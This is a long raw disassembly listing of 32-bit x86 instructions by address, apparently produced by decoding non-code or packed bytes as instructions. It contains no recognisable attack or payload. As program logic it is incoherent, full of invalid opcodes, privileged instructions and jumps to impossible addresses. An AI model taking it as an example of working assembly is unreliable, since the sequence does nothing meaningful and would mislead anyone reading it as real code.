  443c66:	push   ecx
  443c67:	es dec edi
  443c69:	stc    
  443c6a:	scas   eax,DWORD PTR es:[edi]
  443c6b:	xchg   ecx,eax
  443c6c:	jno    0x443cca
  443c6e:	test   al,0x2b
  443c70:	mov    edi,0x747c1c3
  443c75:	jmp    0x443c0a
  443c77:	cmc    
  443c78:	nop
  443c79:	imul   esi,DWORD PTR [eiz*1+0x56236069],0xffffff9e
  443c81:	pusha  
  443c82:	ret    0x5a16
  443c85:	mov    WORD PTR [edi+0x5f],cs
  443c88:	dec    edi
  443c89:	scas   al,BYTE PTR es:[edi]
  443c8a:	xlat   BYTE PTR ds:[ebx]
  443c8b:	(bad)  
  443c8c:	cmp    al,0xe7
  443c8e:	jg     0x443d00
  443c90:	fst    DWORD PTR [edi+0x12]
  443c93:	stos   DWORD PTR es:[edi],eax
  443c94:	iret   
  443c95:	test   al,0xe7
  443c97:	sub    eax,0x6be7be45
  443c9c:	sbb    BYTE PTR [eax],ch
  443c9e:	rcr    DWORD PTR [edx],1
  443ca0:	jno    0x443cf7
  443ca2:	sbb    al,0xb7
  443ca4:	loope  0x443c82
  443ca6:	sbb    BYTE PTR [eiz*1+0x76ef5ed1],ah
  443cad:	or     ebp,ebx
  443caf:	xchg   BYTE PTR [esi-0x4f],cl
  443cb2:	xchg   DWORD PTR [esi],esp
  443cb4:	ret    
  443cb5:	imul   ebx,DWORD PTR [esi],0x77
  443cb8:	ss xchg ebx,eax
  443cba:	imul   ebx,DWORD PTR [esi-0x61cc2697],0x9b7204b9
  443cc4:	test   BYTE PTR [edi+0x5ced0da2],ah
  443cca:	mov    eax,ds:0xaf46945b
  443ccf:	sub    DWORD PTR [ecx],0x756b9bd7
  443cd5:	push   0xffffffef
  443cd7:	add    cl,BYTE PTR ds:0xad0eafbe
  443cdd:	mov    bh,0xc
  443cdf:	pop    esp
  443ce0:	jns    0x443cb2
  443ce2:	in     eax,0x1
  443ce4:	enter  0x379b,0xc4
  443ce8:	dec    ecx
  443ce9:	imul   ebx,DWORD PTR [ecx+ecx*1+0x62822d62],0x38416081
  443cf4:	push   ebp
  443cf5:	sti    
  443cf6:	inc    ecx
  443cf7:	adc    eax,0xeed7aadf
  443cfc:	pushf  
  443cfd:	sub    al,0xbb
  443cff:	xchg   esi,eax
  443d00:	mov    bh,0x78
  443d02:	das    
  443d03:	jno    0x443cca
  443d05:	cs pop esi
  443d07:	adc    eax,0x831d0b24
  443d0c:	jmp    0x202ca6c1
  443d11:	add    eax,0xb5712f90
  443d16:	stos   DWORD PTR es:[edi],eax
  443d17:	fstp   DWORD PTR [ecx]
  443d19:	std    
  443d1a:	cmp    dl,BYTE PTR [edx]
  443d1c:	(bad)
  443d20:	jge    0x443cf3
  443d22:	loop   0x443d7b
  443d24:	(bad)  
  443d25:	mov    cl,0xa1
  443d27:	call   0xa81a321b
  443d2c:	mov    WORD PTR [ecx],?
  443d2e:	mov    DWORD PTR ds:0x5656cf28,ebx
  443d34:	das    
  443d35:	out    0x71,eax
  443d37:	jp     0x443d75
  443d39:	mov    esi,0x88aed822
  443d3e:	pop    eax
  443d3f:	xor    cl,BYTE PTR [eax]
  443d41:	xor    ebp,esi
  443d43:	adc    dh,BYTE PTR [eax-0x20]
  443d46:	mov    esi,ebx
  443d48:	lock call 0xb470762e
  443d4e:	mov    bl,0x6e
  443d50:	add    bh,BYTE PTR [edx+0x6]
  443d53:	and    DWORD PTR [eax+0x7b],ecx
  443d56:	add    dl,ah
  443d58:	ret    
  443d59:	jmp    0x443daa
  443d5b:	test   dl,bh
  443d5d:	mov    ecx,0xd0d1c00f
  443d62:	pop    esi
  443d63:	ins    DWORD PTR es:[edi],dx
  443d64:	adc    eax,0x4b5f1e17
  443d69:	sahf   
  443d6a:	sar    DWORD PTR es:[eax-0x2d],cl
  443d6e:	retf   0x8782
  443d71:	popa   
  443d72:	loop   0x443d94
  443d74:	(bad)  
  443d75:	and    DWORD PTR [ebx+0x4c460409],esi
  443d7b:	cld    
  443d7c:	jne    0x443d79
  443d7e:	pop    ecx
  443d7f:	dec    ebp
  443d80:	rep ins DWORD PTR es:[edi],dx
  443d82:	ja     0x443dd3
  443d84:	or     eax,0x806bf19e
  443d89:	mov    BYTE PTR [ecx+0x23],cl
  443d8c:	jge    0x443d90
  443d8e:	or     eax,0xeaf7cbb9
  443d93:	(bad)  
  443d94:	fs cwd 
  443d97:	push   edx
  443d98:	xchg   esi,eax
  443d99:	sbb    bh,cl
  443d9b:	sub    BYTE PTR [eax-0x5ce35212],dh
  443da1:	int    0xdc
  443da3:	pop    esp
  443da4:	repz pop eax
  443da6:	mov    al,0x57
  443da8:	mov    eax,0x8b1577f8
  443dad:	gs lahf 
  443daf:	adc    al,0xa2
  443db2:	arpl   WORD PTR [ecx],ax
  443db4:	jb     0x443e31
  443db6:	out    0x54,eax
  443db8:	lock repz sub dh,dl
  443dbc:	or     DWORD PTR [esp+esi*4],edx
  443dbf:	mov    WORD PTR ds:0xe7dd4fc2,ds
  443dc5:	pop    ecx
  443dc6:	aam    0x20
  443dc8:	xchg   BYTE PTR [edi],dh
  443dca:	add    al,0xcb
  443dcc:	aam    0xf4
  443dce:	push   ebp
  443dcf:	ret    
  443dd0:	xchg   DWORD PTR [ebx-0x48],esp
  443dd3:	xchg   esp,eax
  443dd4:	popw   es
  443dd6:	cld    
  443dd7:	outs   dx,BYTE PTR ds:[esi]
  443dd8:	cmp    ecx,ebp
  443dda:	dec    edi
  443ddb:	pop    ss
  443ddc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  443ddd:	sub    ebx,ebx
  443ddf:	add    bh,BYTE PTR ds:0x6bd0dbdc
  443de5:	push   ebx
  443de6:	cmc    
  443de7:	sbb    BYTE PTR [eax],ch
  443de9:	push   ebx
  443dea:	repnz shr DWORD PTR ds:0x10631db2,cl
  443df1:	in     eax,dx
  443df2:	in     al,0xe5
  443df4:	mov    eax,0xffd814e6
  443df9:	xchg   edi,eax
  443dfa:	aas    
  443dfb:	and    DWORD PTR [ecx-0x6e],esp
  443dfe:	add    DWORD PTR [esi+0x37],ebp
  443e01:	lock lock call 0xd616996c
  443e08:	inc    edi
  443e09:	clc    
  443e0a:	jle    0x443e26
  443e0c:	pop    ss
  443e0d:	cmp    ebp,DWORD PTR [ecx]
  443e0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  443e10:	aas    
  443e11:	outs   dx,DWORD PTR ds:[esi]
  443e12:	loope  0x443e13
  443e14:	call   FWORD PTR [ebx+0x64]
  443e17:	or     DWORD PTR ds:0xd2dd7781,edi
  443e1d:	rcr    DWORD PTR [edi],1
  443e1f:	add    eax,0xfa41a17
  443e24:	adc    BYTE PTR [eax],ah
  443e26:	cmp    ch,BYTE PTR [edx]
  443e28:	sbb    al,0xd9
  443e2a:	push   esp
  443e2b:	and    ebx,DWORD PTR [edx+0x49]
  443e2e:	les    ebx,FWORD PTR [edi+0xd]
  443e31:	test   DWORD PTR [edi+0x17063a0e],ecx
  443e37:	add    DWORD PTR [ebp+0x60],0x8
  443e3b:	aad    0xd9
  443e3d:	and    DWORD PTR [edx-0x311358b5],ebp
  443e43:	adc    eax,0xcba74307
  443e48:	pop    esp
  443e49:	retf   0xad37
  443e4c:	fisub  WORD PTR [ecx+edx*4-0x66]
  443e50:	pop    ds
  443e51:	push   esp
  443e52:	sbb    ebx,DWORD PTR [esi-0x5dd36dbb]
  443e58:	inc    esp
  443e59:	xor    esp,DWORD PTR [esi-0x7d8e566a]
  443e5f:	into   
  443e60:	mov    BYTE PTR [esi-0x395bb7ef],ah
  443e66:	jae    0x443ec2
  443e68:	mov    eax,ds:0x7c1e82b8
  443e6d:	cmp    eax,0x1c835033
  443e72:	mov    al,0x31
  443e74:	enter  0x62dc,0xd4
  443e78:	or     DWORD PTR [eax-0x1aee2ee0],0xffffff8c
  443e7f:	dec    ebx
  443e80:	push   edx
  443e81:	out    dx,al
  443e82:	imul   esp,DWORD PTR [edi+0x2781130c],0xffffffe6
  443e89:	call   0x8f95:0xf9738110
  443e90:	jb     0x443e37
  443e92:	sbb    bh,dl
  443e94:	leave  
  443e95:	push   0x27
  443e97:	test   al,0x1f
  443e99:	sbb    eax,DWORD PTR [ebx+0xc]
  443e9c:	mov    WORD PTR [ebx+esi*8-0x18],fs
  443ea0:	fldenv [ecx+0x24fe9a8e]
  443ea6:	es mov edx,0x6ae0ad28
  443eac:	mov    bh,0x55
  443eae:	ins    DWORD PTR es:[edi],dx
  443eaf:	xor    DWORD PTR ss:[edi+0x67],ecx
  443eb3:	fwait
  443eb4:	aad    0x6b
  443eb6:	in     eax,dx
  443eb7:	jne    0x443f34
  443eb9:	adc    DWORD PTR [edx+0x2b92c3a],0x51
  443ec0:	xor    BYTE PTR [edi+0x3c913a43],0xde
  443ec7:	jle    0x443f32
  443ec9:	and    ah,BYTE PTR [esi+0x52]
  443ecc:	dec    esi
  443ecd:	clc    
  443ece:	mov    dl,0x3f
  443ed0:	cmp    ch,bl
  443ed2:	gs pop edi
  443ed4:	add    al,0x95
  443ed6:	push   esp
  443ed7:	sbb    BYTE PTR [esi],ah
  443ed9:	movq   mm0,mm1
  443edc:	sahf   
  443edd:	ret    0x6190
  443ee0:	out    dx,al
  443ee1:	and    ch,ch
  443ee3:	call   0x4ea4ad59
  443ee8:	or     edx,DWORD PTR [ebp-0x64d3b43d]
  443eee:	pop    ecx
  443eef:	jns    0x443f6b
  443ef1:	dec    esi
  443ef2:	sub    DWORD PTR [edx+0x7],edx
  443ef5:	and    esp,DWORD PTR [edi+0x5]
  443ef8:	sub    eax,DWORD PTR [ecx-0x20a716a8]
  443efe:	pop    esp
  443eff:	ins    BYTE PTR es:[edi],dx
  443f00:	dec    edi
  443f01:	rcr    BYTE PTR [edx+0x48],1
  443f04:	sub    al,0x58
  443f06:	dec    ebx
  443f07:	xchg   ebx,eax
  443f08:	sub    ebx,eax
  443f0a:	cli    
  443f0b:	mov    dh,0xbb
  443f0d:	jno    0x443f14
  443f0f:	dec    esi
  443f10:	das    
  443f11:	dec    DWORD PTR [ebx+ecx*8+0x79]
  443f15:	sbb    DWORD PTR [ebx+0x705e6846],esp
  443f1b:	frstpm(287 only) 
  443f1d:	sub    ch,al
  443f1f:	or     eax,0x73c81411
  443f24:	pushw  cs
  443f26:	dec    ebx
  443f27:	or     esi,DWORD PTR ds:0xe7137543
  443f2d:	xchg   DWORD PTR [edi+eiz*8+0x19be22c2],ebp
  443f34:	popa   
  443f35:	icebp  
  443f36:	mov    ecx,0x66c89f1e
  443f3b:	sbb    eax,0x4b16193e
  443f40:	cmp    DWORD PTR [edx+0x6d2500c0],eax
  443f46:	sbb    DWORD PTR [edi-0x2d],edx
  443f49:	fcmovnb st,st(2)
  443f4b:	cmc    
  443f4c:	aas    
  443f4d:	sub    ebx,DWORD PTR [ecx+esi*8]
  443f50:	sbb    al,0x53
  443f52:	or     al,0xfb
  443f54:	bound  ecx,QWORD PTR [eax]
  443f56:	xor    eax,0x1a5077f9
  443f5b:	outs   dx,DWORD PTR ds:[esi]
  443f5c:	test   eax,0x1b23a781
  443f61:	sahf   
  443f62:	retf   0x41e9
  443f65:	jmp    0xaaecf80b
  443f6a:	inc    edx
  443f6b:	call   0xc2e4:0x92ca3203
  443f72:	fwait
  443f73:	outs   dx,DWORD PTR ds:[esi]
  443f74:	repnz push edx
  443f76:	sbb    ebp,ecx
  443f78:	call   0xfbe0:0xd58cd5ea
  443f7f:	int    0xdf
  443f81:	popf   
  443f82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  443f83:	aas    
  443f84:	sub    eax,0xb9161cd9
  443f89:	pop    ebx
  443f8a:	(bad)  
  443f8b:	dec    ecx
  443f8c:	xchg   ebx,eax
  443f8d:	jecxz  0x443f61
  443f8f:	adc    BYTE PTR [esi+0x10f891b9],ah
  443f95:	int    0x7a
  443f97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  443f98:	in     al,0x86
  443f9a:	sbb    eax,0x87aaeb7b
  443f9f:	push   edi
  443fa0:	loopne 0x443f32
  443fa2:	mov    WORD PTR [ecx+0x3b],?
  443fa5:	imul   esp,eax,0x1951e19d
  443fab:	sti    
  443fac:	adc    ebp,esp
  443fae:	daa    
  443faf:	sub    BYTE PTR [ebx-0x5869e631],dh
  443fb5:	sti    
  443fb6:	and    dl,dh
  443fb8:	call   0xe5ddf045
  443fbd:	adc    ebp,DWORD PTR [ebx-0x75]
  443fc0:	call   DWORD PTR [edi+0x7c5cd699]
  443fc6:	jnp    0x443fe8
  443fc8:	dec    edi
  443fc9:	ficom  WORD PTR [ebx+0x1ec97df4]
  443fcf:	imul   ebx,DWORD PTR [esi],0x9
  443fd2:	mov    eax,ds:0x9f8526
  443fd7:	mov    eax,ds:0x6fafd9e6
  443fdc:	test   eax,0xa5753ffd
  443fe1:	fwait
  443fe2:	inc    esi
  443fe3:	mov    ebx,0xfd500139
  443fe8:	xchg   ebp,eax
  443fe9:	cmp    ecx,edx
  443feb:	sbb    eax,0x3a7b3151
  443ff0:	mov    BYTE PTR [ebx+edi*4+0x6a],dl
  443ff4:	in     eax,0x97
  443ff6:	imul   eax,DWORD PTR [ecx],0x45392df
  443ffc:	loopne 0x443f85
  443ffe:	pop    es
  443fff:	std    
  444000:	mov    ah,bh
  444002:	sbb    eax,DWORD PTR [ebp+0xf]
  444005:	je     0x44406a
  444007:	push   ss
  444008:	pop    edi
  444009:	xor    al,0x28
  44400b:	and    BYTE PTR [edx],bh
  44400d:	dec    eax
  44400e:	(bad)  
  44400f:	xor    BYTE PTR [esi+0xd33aa5],al
  444015:	lock shl DWORD PTR fs:[esi-0x7eca57fd],cl
  44401d:	cmp    BYTE PTR [ecx-0x162c3d1f],ch
  444023:	jmp    0xbfe6:0xec5f9d2c
  44402a:	pop    ebp
  44402b:	movaps XMMWORD PTR [ebx-0xf],xmm7
  44402f:	pop    ds
  444030:	aas    
  444031:	or     al,0x3
  444033:	mov    eax,0xc1c50ba0
  444038:	aaa    
  444039:	lods   eax,DWORD PTR ds:[esi]
  44403a:	mov    ds:0xbffd98ae,eax
  44403f:	shl    DWORD PTR [edi+ebx*2],0xa8
  444043:	outs   dx,BYTE PTR ds:[esi]
  444044:	ret    
  444045:	dec    ebx
  444046:	pushf  
  444047:	dec    ebx
  444048:	ins    DWORD PTR es:[edi],dx
  444049:	and    eax,0x927c9e40
  44404e:	mov    bh,BYTE PTR ds:0xb3715b6d
  444054:	ss add ebx,0xbfe6d53b
  44405b:	stos   DWORD PTR es:[edi],eax
  44405c:	mov    BYTE PTR [eax-0x20],0x8e
  444060:	pop    esp
  444061:	iret   
  444062:	push   edi
  444063:	mov    eax,ds:0x83005834
  444068:	sub    ah,dh
  44406a:	cmp    esp,esi
  44406c:	rol    DWORD PTR [ebp+edi*1-0x5b],0xe1
  444071:	rol    bl,0xc7
  444074:	sub    eax,0xc88708d7
  444079:	jmp    0xad24953
  44407e:	inc    ebp
  44407f:	inc    esi
  444080:	pop    esi
  444081:	jg     0x44409f
  444083:	imul   esi,esp,0x5b
  444086:	mov    eax,ds:0x9fcb9543
  44408b:	je     0x4440fd
  44408d:	(bad)  
  44408e:	sbb    ah,dh
  444090:	mov    ecx,0x94f4e0f
  444095:	mov    cl,0x8d
  444097:	jle    0x4440b0
  444099:	out    0xf6,al
  44409b:	into   
  44409c:	sbb    BYTE PTR [eax+0x501510ab],0x65
  4440a3:	(bad)  
  4440a4:	fwait
  4440a5:	inc    ebx
  4440a6:	(bad)  
  4440a7:	ds pop ds
  4440a9:	loopne 0x44403c
  4440ab:	jg     0x44406c
  4440ad:	enter  0x6dde,0x8b
  4440b1:	jb     0x444070
  4440b3:	dec    edx
  4440b4:	mov    esi,0x6e86304e
  4440b9:	fild   QWORD PTR [ecx+0x5056b829]
  4440bf:	lods   eax,DWORD PTR ds:[esi]
  4440c0:	inc    ebp
  4440c1:	or     eax,0x4ed4503b
  4440c6:	add    al,0xe2
  4440c8:	dec    eax
  4440c9:	mov    esi,DWORD PTR [ebx-0x69]
  4440cc:	sbb    ebp,esp
  4440ce:	nop
  4440cf:	(bad)  
  4440d0:	cmc    
  4440d1:	in     eax,dx
  4440d2:	cmp    eax,0x95d5fe8a
  4440d7:	jae    0x44409c
  4440d9:	sbb    BYTE PTR [esp+eax*4+0x7e84167d],bh
  4440e0:	cmp    eax,0x2c20624a
  4440e5:	mov    bh,0x82
  4440e7:	neg    ecx
  4440e9:	mov    dl,0xd7
  4440eb:	mov    eax,0x1e9b20cc
  4440f0:	sub    eax,0x7c097a8d
  4440f5:	jmp    0x976c6fed
  4440fa:	sbb    eax,0x3450fc59
  4440ff:	and    al,0x2e
  444101:	sub    edx,0x434a6870
  444107:	jnp    0x4440e1
  444109:	std    
  44410a:	xor    DWORD PTR [edi],esi
  44410c:	out    dx,al
  44410d:	push   ds
  44410e:	retf   
  44410f:	xchg   esp,eax
  444110:	xchg   BYTE PTR [esi+0x59f2ade0],ch
  444116:	lods   al,BYTE PTR ds:[esi]
  444117:	ret    0xc99d
  44411a:	fmul   DWORD PTR [ecx]
  44411c:	dec    ebp
  44411d:	hlt    
  44411e:	imul   edi,DWORD PTR [esi+0x64],0xffffffbf
  444122:	pop    edi
  444123:	inc    esi
  444124:	sbb    edx,DWORD PTR [esi-0x16]
  444127:	pop    ecx
  444128:	jo     0x444140
  44412a:	sub    DWORD PTR [ebp+0xe38f728],esp
  444130:	mov    esp,ecx
  444132:	fdivr  DWORD PTR [esi]
  444134:	fwait
  444135:	inc    cl
  444137:	inc    esi
  444138:	stos   DWORD PTR es:[edi],eax
  444139:	add    al,BYTE PTR [eax-0x29]
  44413c:	cmp    eax,0xfdc4730
  444141:	(bad)  
  444142:	and    esp,esi
  444144:	repz adc eax,0x3b3b7d49
  44414a:	out    0xcc,eax
  44414c:	aad    0x4f
  44414e:	dec    ebx
  44414f:	sar    BYTE PTR [esi+0x1b4041dd],0xbc
  444156:	ins    BYTE PTR es:[edi],dx
  444157:	loop   0x444143
  444159:	cmp    BYTE PTR [edx],0x91
  44415c:	pop    edx
  44415d:	jg     0x4440e4
  44415f:	sbb    BYTE PTR [edx+eiz*1+0x67daf3cf],0xe8
  444167:	push   0xffffffe4
  444169:	sub    BYTE PTR [ebx-0x13],bh
  44416c:	xchg   esi,eax
  44416d:	pop    ebx
  44416e:	dec    ecx
  44416f:	mul    eax
  444171:	(bad)  
  444172:	adc    ecx,DWORD PTR [edx]
  444174:	pop    eax
  444175:	fdecstp 
  444177:	das    
  444178:	cli    
  444179:	inc    ebp
  44417a:	std    
  44417b:	xor    al,0xa9
  44417d:	jmp    0x444184
  44417f:	cli    
  444180:	jbe    0x44416b
  444182:	xor    dh,ah
  444184:	fimul  DWORD PTR [esi-0x1abe283a]
  44418a:	mov    esi,0xd960a0e9
  44418f:	aad    0xd0
  444191:	rcr    BYTE PTR ds:0x3128bf46,cl
  444197:	inc    edx
  444198:	test   cl,al
  44419a:	int3   
  44419b:	repnz xlat BYTE PTR ds:[ebx]
  44419d:	nop
  44419e:	js     0x444210
  4441a0:	pop    esp
  4441a1:	push   0x6c7281b5
  4441a6:	jbe    0x4441a5
  4441a8:	push   ebx
  4441a9:	(bad)  
  4441ab:	push   ecx
  4441ac:	mov    ebx,0xa0838b88
  4441b1:	dec    edi
  4441b2:	shl    DWORD PTR [ecx-0x26],cl
  4441b5:	cli    
  4441b6:	or     ch,BYTE PTR [esi+0x66]
  4441b9:	into   
  4441ba:	push   cs
  4441bb:	dec    ebx
  4441bc:	xchg   DWORD PTR [edi-0x544da92b],ecx
  4441c2:	jp     0x444231
  4441c4:	mov    esp,0x9ee056e2
  4441c9:	jne    0x44423d
  4441cb:	xlat   BYTE PTR ds:[ebx]
  4441cc:	in     al,0xe6
  4441ce:	push   esp
  4441cf:	push   0x9dc9f114
  4441d4:	inc    esi
  4441d5:	enter  0xb193,0x49
  4441d9:	pop    ebx
  4441da:	xchg   edi,eax
  4441db:	shr    DWORD PTR [eax-0x4e],0x25
  4441df:	sahf   
  4441e0:	pop    ds
  4441e1:	and    eax,0x936d2727
  4441e6:	cmc    
  4441e7:	push   ds
  4441e8:	dec    ecx
  4441e9:	mov    bl,BYTE PTR [esi-0x68]
  4441ec:	retf   
  4441ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4441ee:	cmp    al,0xe8
  4441f0:	dec    edx
  4441f1:	lahf   
  4441f2:	inc    eax
  4441f3:	inc    ecx
  4441f4:	repz add BYTE PTR [ecx-0x576bdc64],0x32
  4441fc:	in     eax,dx
  4441fd:	xchg   esp,eax
  4441fe:	push   0xfffffff9
  444200:	and    bh,cl
  444202:	pop    ecx
  444203:	cwde   
  444204:	hlt    
  444205:	pusha  
  444206:	cwde   
  444207:	sub    ecx,DWORD PTR [edi-0xa]
  44420a:	repnz mov ecx,0x6eb71e44
  444210:	mov    bl,0xf1
  444212:	mov    DWORD PTR [ecx-0x34],0x82eee4ab
  444219:	push   esp
  44421a:	imul   BYTE PTR [esi+ebx*4-0x1b751e55]
  444221:	inc    edx
  444222:	or     eax,0x662f4862
  444227:	adc    BYTE PTR [eax-0x53f5a1a7],0x1
  44422e:	jp     0x44426d
  444230:	sub    BYTE PTR [ebp-0xf],ch
  444233:	jae    0x4441f1
  444235:	pop    es
  444236:	in     eax,0x8a
  444238:	std    
  444239:	pop    ebx
  44423a:	leave  
  44423b:	pop    ecx
  44423c:	dec    ebp
  44423d:	or     DWORD PTR [ebx-0x67],0xffffffa9
  444241:	arpl   sp,ax
  444243:	repnz inc BYTE PTR ds:0x73ca7bee
  44424a:	inc    edx
  44424b:	rcl    BYTE PTR [ecx+ebp*4+0x691fa04f],cl
  444252:	adc    al,BYTE PTR [edi-0x12]
  444255:	rcl    DWORD PTR ds:0x9cda1101,1
  44425b:	lock cdq 
  44425d:	push   eax
  44425e:	or     al,0xe0
  444260:	test   DWORD PTR [edx],ebx
  444262:	adc    esi,DWORD PTR [ecx-0x403d0afe]
  444268:	mov    ecx,0x21ea7f4b
  44426d:	daa    
  44426e:	sti    
  44426f:	and    bh,BYTE PTR [ebx-0x43dee7a3]
  444275:	xlat   BYTE PTR ds:[ebx]
  444276:	lods   al,BYTE PTR ds:[esi]
  444277:	sbb    BYTE PTR [ecx],bl
  444279:	test   BYTE PTR [edi+0x4d],0x9b
  44427d:	cdq    
  44427e:	bound  eax,QWORD PTR [ecx-0x2dda07a]
  444284:	aad    0x8b
  444286:	je     0x444216
  444288:	fwait
  444289:	pop    ecx
  44428a:	mov    ch,0xc5
  44428c:	je     0x444242
  44428e:	(bad)  
  44428f:	mov    edx,0xf19f80be
  444294:	sti    
  444295:	and    edi,DWORD PTR [esi+0x54d123d0]
  44429b:	mov    dl,0x38
  44429d:	or     BYTE PTR [edx],dl
  44429f:	inc    ecx
  4442a0:	and    dh,bl
  4442a2:	pop    edi
  4442a3:	hlt    
  4442a4:	jns    0x444296
  4442a6:	daa    
  4442a7:	int    0x8d
  4442a9:	add    ebx,DWORD PTR [ebx+ecx*2]
  4442ac:	pop    es
  4442ad:	shl    BYTE PTR [ebx],0xb0
  4442b0:	adc    cl,BYTE PTR [edx+esi*2]
  4442b3:	adc    esp,DWORD PTR [edx+0x477df20d]
  4442b9:	sub    al,0xc7
  4442bb:	sub    ebp,esi
  4442bd:	and    BYTE PTR [edx+0x6c],dl
  4442c0:	push   ebp
  4442c1:	(bad)  [esp]
  4442c4:	popf   
  4442c5:	push   0x31
  4442c7:	jne    0x444313
  4442c9:	ja     0x4442a5
  4442cb:	dec    ecx
  4442cc:	jae    0x4442bb
  4442ce:	sub    esi,DWORD PTR [ebx+0x53cfed9b]
  4442d4:	dec    ebp
  4442d5:	mov    BYTE PTR [ebp-0x1dc20fdf],ah
  4442db:	pushf  
  4442dc:	and    dh,bh
  4442de:	mov    ebx,0x2ef838dc
  4442e3:	pop    es
  4442e4:	mov    esi,0x39d9e8d
  4442e9:	sar    DWORD PTR [ebp-0x64],cl
  4442ec:	or     al,0xe3
  4442ee:	or     DWORD PTR [ebx+0x51],0xa8f72808
  4442f5:	add    DWORD PTR [edx+0x7c7fa3e2],eax
  4442fb:	dec    esp
  4442fc:	daa    
  4442fd:	add    eax,0x6bc0b7c6
  444302:	scas   eax,DWORD PTR es:[edi]
  444303:	sbb    al,0x93
  444305:	jbe    0x444341
  444307:	pop    ebp
  444308:	loop   0x444360
  44430a:	daa    
  44430b:	pop    ecx
  44430c:	mov    esp,0x21a3adc1
  444311:	fs ins DWORD PTR es:[edi],dx
  444313:	add    esp,edx
  444315:	les    edi,FWORD PTR [edi+esi*1+0x5e]
  444319:	loop   0x444306
  44431b:	add    ah,bl
  44431d:	sbb    al,0xb7
  44431f:	xchg   edi,eax
  444320:	fadd   st,st(3)
  444322:	imul   ecx,edi,0xffffff9a
  444325:	mov    BYTE PTR [ecx+0x3714217],dl
  44432b:	cmc    
  44432c:	sub    al,0x72
  44432e:	add    al,0x8a
  444330:	call   FWORD PTR [ebx]
  444332:	fsub   QWORD PTR [ebx]
  444334:	or     al,0x2e
  444336:	add    ecx,DWORD PTR [ebx-0x1f]
  444339:	mov    edi,0x8d1f737b
  44433e:	lods   eax,DWORD PTR ds:[esi]
  444340:	aas    
  444341:	test   cl,dl
  444343:	and    ch,BYTE PTR [edi]
  444345:	leave  
  444346:	cld    
  444347:	pushw  es
  444349:	add    al,0x6c
  44434b:	fisttp QWORD PTR [esi]
  44434d:	aad    0x93
  44434f:	iret   
  444350:	into   
  444351:	cli    
  444352:	push   edi
  444353:	pop    ebx
  444354:	mul    BYTE PTR fs:[edx-0x61]
  444358:	sub    al,0xdd
  44435a:	repz je 0x444338
  44435d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44435e:	mov    WORD PTR [edi],cs
  444360:	in     eax,0x6f
  444362:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  444363:	cmc    
  444364:	sub    al,0x9a
  444366:	neg    DWORD PTR [ebx*4+0x16db1aa7]
  44436d:	rcl    BYTE PTR [edi-0x56ade29a],0x88
  444374:	jne    0x444375
  444376:	scas   al,BYTE PTR es:[edi]
  444377:	or     eax,0x2803d26f
  44437c:	pop    ebx
  44437d:	add    BYTE PTR [edx],ch
  44437f:	and    eax,0xc3dc0b39
  444384:	out    0x46,al
  444386:	xlat   BYTE PTR ds:[ebx]
  444387:	add    DWORD PTR [edi],0x6eb2f4cc
  44438d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44438e:	dec    ebx
  44438f:	fild   QWORD PTR [ebp+0x25]
  444392:	retf   0x5df1
  444395:	and    al,0x46
  444397:	cwde   
  444398:	pop    esi
  444399:	jp     0x444355
  44439b:	inc    ebp
  44439c:	xlat   BYTE PTR ds:[ebx]
  44439d:	pop    ebp
  44439e:	jmp    0x444350
  4443a0:	xchg   ebp,eax
  4443a1:	push   es
  4443a2:	inc    BYTE PTR [ebx+0x78084d78]
  4443a8:	mov    eax,ds:0x7f03fb3f
  4443ad:	cwde   
  4443ae:	push   0x74
  4443b0:	push   ss
  4443b1:	mov    ?,WORD PTR [esi+0x75]
  4443b4:	pop    edx
  4443b5:	xor    esi,edi
  4443b7:	mov    ebp,0x300595f7
  4443bc:	mov    WORD PTR [eax-0x64687e0b],fs
  4443c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4443c3:	jp     0x444399
  4443c5:	scas   eax,DWORD PTR es:[edi]
  4443c6:	cdq    
  4443c7:	bound  ecx,QWORD PTR [ecx]
  4443c9:	ins    DWORD PTR es:[edi],dx
  4443ca:	ins    BYTE PTR es:[edi],dx
  4443cb:	mov    ds:0x1b60c727,eax
  4443d0:	cmp    DWORD PTR [ebx],0xf1b5a4b1
  4443d6:	and    dh,BYTE PTR [ecx-0x44]
  4443d9:	fucom  st(2)
  4443db:	sub    BYTE PTR [eax+0x7c9a646],dh
  4443e1:	cmp    al,0x24
  4443e3:	outs   dx,DWORD PTR ds:[esi]
  4443e4:	adc    DWORD PTR [ebx],esp
  4443e6:	jns    0x44445e
  4443e8:	into   
  4443e9:	ds ret 0xb688
  4443ed:	in     al,dx
  4443ee:	pop    ss
  4443ef:	or     eax,0xfdfa8585
  4443f4:	daa    
  4443f5:	fisub  WORD PTR [eax]
  4443f7:	outs   dx,BYTE PTR ds:[esi]
  4443f8:	ja     0x444391
  4443fa:	(bad)  
  4443fb:	sbb    eax,esi
  4443fd:	pop    esp
  4443fe:	imul   ebp,DWORD PTR [eax+eiz*8],0x29642077
  444405:	scas   al,BYTE PTR es:[edi]
  444406:	cmp    al,0xf4
  444408:	mov    ch,0xdf
  44440a:	jmp    0x4443d9
  44440c:	push   ds
  44440d:	jge    0x4443e5
  44440f:	cmp    eax,0x878092a7
  444414:	jmp    0x9ced:0xe88c0701
  44441b:	sti    
  44441c:	test   edx,ecx
  44441e:	aas    
  44441f:	sub    edi,DWORD PTR [edx]
  444421:	add    DWORD PTR [ebx+ecx*2-0x78],ebx
  444425:	dec    ebx
  444426:	or     eax,0xcafbacf5
  44442b:	ret    
  44442c:	ins    BYTE PTR es:[edi],dx
  44442d:	test   al,0x67
  44442f:	push   esi
  444430:	mov    ebp,0xb147e298
  444435:	call   0xf3fef315
  44443a:	mov    edx,0xc4fabfc2
  44443f:	jnp    0x444487
  444441:	sub    bh,bl
  444443:	pop    ecx
  444444:	xlat   BYTE PTR ds:[ebx]
  444445:	iret   
  444446:	xor    eax,0x6b1ce770
  44444b:	nop
  44444c:	push   esp
  44444d:	mov    esp,0xa7364c90
  444452:	inc    ebx
  444453:	aam    0x67
  444455:	cld    
  444456:	(bad)  
  444457:	loopne 0x4444b4
  444459:	stos   DWORD PTR es:[edi],eax
